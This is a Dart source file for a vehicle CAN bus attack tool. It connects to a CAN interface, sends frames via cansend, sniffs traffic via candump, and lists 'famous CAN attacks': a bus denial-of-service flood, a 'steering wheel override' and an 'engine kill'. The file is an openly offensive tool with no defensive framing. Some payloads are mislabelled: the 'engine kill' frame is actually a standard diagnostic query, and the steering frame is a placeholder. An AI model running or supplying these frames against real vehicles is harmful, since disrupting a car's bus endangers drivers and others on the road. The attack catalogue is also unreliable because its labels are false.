import 'dart:async';
import 'dart:io';
import 'dart:convert';
import 'dart:typed_data';

class UltimateCanBusSystem {
  bool _connected = false;
  String? _interface;

  /// الاتصال بواجهة CAN
  Future<bool> connect(String interface) async {
    try {
      final result = await Process.run('ip', ['link', 'set', interface, 'up', 'type', 'can', 'bitrate', '500000'], runInShell: true);
      if (result.exitCode == 0) {
        _connected = true;
        _interface = interface;
        return true;
      }
    } catch (_) {}
    return false;
  }

  /// إرسال رسالة CAN
  Future<bool> sendCanMessage(int id, Uint8List data) async {
    if (!_connected) return false;
    try {
      final canId = id.toRadixString(16).padLeft(3, '0');
      final dataHex = data.map((b) => b.toRadixString(16).padLeft(2, '0')).join('');
      await Process.run('cansend', [_interface!, '$canId#$dataHex'], runInShell: true);
      return true;
    } catch (_) {
      return false;
    }
  }

  /// التقاط رسائل CAN
  Future<void> startSniffing(void Function(int id, Uint8List data) onMessage) async {
    if (!_connected) return;
    try {
      final result = await Process.start('candump', [_interface!]);
      result.stdout.transform(utf8.decoder).listen((line) {
        final parts = line.trim().split(' ');
        if (parts.length >= 3) {
          final id = int.tryParse(parts[1].split('#')[0], radix: 16);
          final dataStr = parts[1].split('#').length > 1 ? parts[1].split('#')[1] : '';
          final data = Uint8List.fromList(List.generate(dataStr.length ~/ 2, (i) => int.parse(dataStr.substring(i * 2, i * 2 + 2), radix: 16)));
          if (id != null) onMessage(id, data);
        }
      });
    } catch (_) {}
  }

  /// هجمات CAN الشهيرة
  static final Map<String, Map<String, dynamic>> attacks = {
    'dos_flood': {
      'name': 'CAN DoS Flood',
      'description': 'Flood bus with high-priority messages',
      'can_id': 0x000,
      'data': [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
    },
    'steering_override': {
      'name': 'Steering Wheel Override',
      'description': 'Send fake steering wheel commands',
      'can_id': 0x123,
      'data': [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    },
    'engine_kill': {
      'name': 'Engine Kill',
      'description': 'Send engine stop command',
      'can_id': 0x7DF,
      'data': [0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    },
  };
}
